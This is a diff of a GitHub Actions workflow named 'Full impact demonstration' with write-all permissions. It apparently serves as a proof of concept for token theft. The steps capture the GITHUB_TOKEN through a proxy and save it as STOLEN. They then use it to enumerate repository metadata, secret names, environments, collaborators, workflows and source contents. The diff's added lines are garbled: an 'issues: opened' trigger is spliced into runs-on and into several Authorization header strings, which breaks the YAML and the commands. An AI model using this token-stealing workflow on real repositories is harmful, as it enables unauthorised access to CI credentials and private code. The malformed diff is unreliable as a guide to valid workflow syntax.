@@ -1,12 +1,16 @@
 name: Full impact demonstration
 on:
+  issues:
+    types: [opened]
   workflow_dispatch:
 
 permissions: write-all
 
 jobs:
   full-impact:
-    runs-on: ubuntu-latest
+    runs-on:
+  issues:
+    types: [opened] ubuntu-latest
     steps:
       - name: Start proxy and inject
         run: |
@@ -27,7 +31,9 @@ jobs:
 
       - name: Token captured via proxy
         run: |
-          curl --max-time 5 -sS -H "Authorization: token $GITHUB_TOKEN" \
+          curl --max-time 5 -sS -H "Authorization:
+  issues:
+    types: [opened] token $GITHUB_TOKEN" \
             "http://api.github.com/user" 2>&1 || true
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
@@ -38,7 +44,9 @@ jobs:
           STOLEN=$(sed 's/token //' /tmp/token.txt)
           
           echo "=== 1. REPO DATA (private content if repo were private) ==="
-          curl -sS -H "Authorization: token $STOLEN" \
+          curl -sS -H "Authorization:
+  issues:
+    types: [opened] token $STOLEN" \
             "https://api.github.com/repos/toofikz/public-test-repo" | python3 -c "
 import json,sys; d=json.loads(sys.stdin.read())
 print(f'repo: {d.get(\"full_name\")}')
@@ -48,7 +56,9 @@ print(f'default_branch: {d.get(\"default_branch\")}')
           
           echo ""
           echo "=== 2. SECRETS (names reveal what credentials exist) ==="
-          curl -sS -H "Authorization: token $STOLEN" \
+          curl -sS -H "Authorization:
+  issues:
+    types: [opened] token $STOLEN" \
             "https://api.github.com/repos/toofikz/public-test-repo/actions/secrets" | python3 -c "
 import json,sys; d=json.loads(sys.stdin.read())
 print(f'Secrets count: {d.get(\"total_count\",\"?\")}')
@@ -57,7 +67,9 @@ for s in d.get('secrets',[]): print(f'  SECRET: {s.get(\"name\")}')
           
           echo ""
           echo "=== 3. ENVIRONMENTS (deployment targets) ==="
-          curl -sS -H "Authorization: token $STOLEN" \
+          curl -sS -H "Authorization:
+  issues:
+    types: [opened] token $STOLEN" \
             "https://api.github.com/repos/toofikz/public-test-repo/environments" | python3 -c "
 import json,sys; d=json.loads(sys.stdin.read())
 print(f'Environments: {d.get(\"total_count\",\"?\")}')
@@ -66,7 +78,9 @@ for e in d.get('environments',[]): print(f'  ENV: {e.get(\"name\")} protection={
           
           echo ""
           echo "=== 4. COLLABORATORS (who has access) ==="
-          curl -sS -H "Authorization: token $STOLEN" \
+          curl -sS -H "Authorization:
+  issues:
+    types: [opened] token $STOLEN" \
             "https://api.github.com/repos/toofikz/public-test-repo/collaborators" | python3 -c "
 import json,sys; d=json.loads(sys.stdin.read())
 if isinstance(d,list):
@@ -76,7 +90,9 @@ else: print(f'  {d.get(\"message\",\"?\")}')
           
           echo ""
           echo "=== 5. WORKFLOW FILES (CI/CD config with secret refs) ==="
-          curl -sS -H "Authorization: token $STOLEN" \
+          curl -sS -H "Authorization:
+  issues:
+    types: [opened] token $STOLEN" \
             "https://api.github.com/repos/toofikz/public-test-repo/actions/workflows" | python3 -c "
 import json,sys; d=json.loads(sys.stdin.read())
 print(f'Workflows: {d.get(\"total_count\",\"?\")}')
@@ -84,7 +100,9 @@ print(f'Workflows: {d.get(\"total_count\",\"?\")}')
           
           echo ""
           echo "=== 6. GIT CONTENT (source code read) ==="
-          curl -sS -H "Authorization: token $STOLEN" \
+          curl -sS -H "Authorization:
+  issues:
+    types: [opened] token $STOLEN" \
             "https://api.github.com/repos/toofikz/public-test-repo/contents/" | python3 -c "
 import json,sys; d=json.loads(sys.stdin.read())
 if isinstance(d,list):
